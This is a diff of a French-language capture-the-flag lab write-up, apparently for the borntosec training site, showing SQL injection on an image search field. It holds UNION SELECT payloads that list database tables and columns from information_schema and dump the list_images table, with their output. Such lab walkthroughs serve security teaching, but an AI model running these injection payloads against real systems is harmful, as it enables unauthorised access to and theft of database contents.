@@ -36,6 +36,7 @@ Title: Hack me ?
 Url : borntosec.ddns.net/images.png
 ```
 
+Tenter cette commande pour afficher des indices sur les tables : `1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;`
 list_images semble pas mal :
 
 ```sql
@@ -51,9 +52,11 @@ Url : list_images
 ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns;
 Title: comment
 Url : list_images
+```
 
-1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
+Afficher des informations pour cette table : `1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images`
 
+```sql
 ID: 1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
 Title: https://fr.wikipedia.org/wiki/Programme_NsaAn image about the NSA !
 Url : 1
